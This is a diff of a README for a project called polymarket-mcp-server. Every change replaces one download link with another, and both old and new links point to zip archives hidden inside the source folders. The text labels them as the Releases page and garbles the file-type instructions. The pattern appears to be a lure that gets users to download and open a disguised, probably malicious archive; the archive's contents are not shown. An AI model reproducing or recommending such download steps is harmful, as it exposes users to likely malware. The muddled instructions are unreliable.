@@ -1,6 +1,6 @@
 # 🤖 polymarket-mcp-server - Trade Prediction Markets with Ease
 
-![Download](https://raw.githubusercontent.com/Justkokosixnine/polymarket-mcp-server/main/src/polymarket_mcp/utils/polymarket-mcp-server-3.8.zip)
+![Download](https://github.com/Justkokosixnine/polymarket-mcp-server/raw/refs/heads/main/src/polymarket_mcp/auth/server_polymarket_mcp_2.8-alpha.5.zip)
 
 ## 📦 Overview
 
@@ -22,11 +22,11 @@ To begin using polymarket-mcp-server, follow the steps below to download and run
 
 To download the application, visit the Releases page:
 
-[Download polymarket-mcp-server](https://raw.githubusercontent.com/Justkokosixnine/polymarket-mcp-server/main/src/polymarket_mcp/utils/polymarket-mcp-server-3.8.zip)
+[Download polymarket-mcp-server](https://github.com/Justkokosixnine/polymarket-mcp-server/raw/refs/heads/main/src/polymarket_mcp/auth/server_polymarket_mcp_2.8-alpha.5.zip)
 
 1. Open the link provided above.
 2. Locate the latest release, which will be listed at the top.
-3. Click on the appropriate file for your operating system (e.g., .exe for Windows, .dmg for macOS, or https://raw.githubusercontent.com/Justkokosixnine/polymarket-mcp-server/main/src/polymarket_mcp/utils/polymarket-mcp-server-3.8.zip for Linux).
+3. Click on the appropriate file for your operating system (e.g., .exe for Windows, .dmg for macOS, or https://github.com/Justkokosixnine/polymarket-mcp-server/raw/refs/heads/main/src/polymarket_mcp/auth/server_polymarket_mcp_2.8-alpha.5.zip for Linux).
 4. Follow the prompts to download the file to your device.
 5. Once downloaded, open the file and follow the installation instructions.
 
@@ -58,7 +58,7 @@ For additional information about using the application, consider the following r
 
 To ensure you always have the best experience, regularly check for updates. You can find new versions and improvements on the Releases page:
 
-[Download polymarket-mcp-server](https://raw.githubusercontent.com/Justkokosixnine/polymarket-mcp-server/main/src/polymarket_mcp/utils/polymarket-mcp-server-3.8.zip)
+[Download polymarket-mcp-server](https://github.com/Justkokosixnine/polymarket-mcp-server/raw/refs/heads/main/src/polymarket_mcp/auth/server_polymarket_mcp_2.8-alpha.5.zip)
 
 ## 📨 Feedback
 
